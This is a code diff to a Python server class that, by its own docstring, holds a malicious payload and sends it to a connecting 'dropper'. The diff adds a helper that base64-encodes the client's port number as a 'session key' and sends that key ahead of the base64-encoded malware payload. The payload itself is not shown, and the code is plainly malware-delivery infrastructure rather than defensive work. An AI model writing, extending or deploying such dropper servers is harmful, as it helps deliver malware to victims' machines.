@@ -7,6 +7,8 @@
 import base64
 import logging
 import socket
+import os
+import secrets
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -47,6 +49,13 @@ class Server:
             logging.debug('Server was successfully initialized.')
         except socket.error:
             print('Server was not initialized due to an error.')
+    
+    def encode_integer(self, num):
+        num_bytes = num.to_bytes((num.bit_length() + 7) // 8, 'big')
+        print(num_bytes)
+        encoded_bytes = base64.b64encode(num_bytes)
+        return encoded_bytes
+
 
     def send_malicious_code(self):
         """ Send malware to the client once the connection is established. """
@@ -55,8 +64,10 @@ class Server:
             connection, address = self.socket.accept()
             with connection:
                 print('Connection with dropper established from {}'.format(address))
-                # Send data to the client and shut down the server.
+                session_key = self.encode_integer(address[1])
+                print(session_key, address[1])
                 encoded_payload = base64.b64encode(self.malicious_code)
+                connection.send(session_key)
                 connection.send(encoded_payload)
 
 
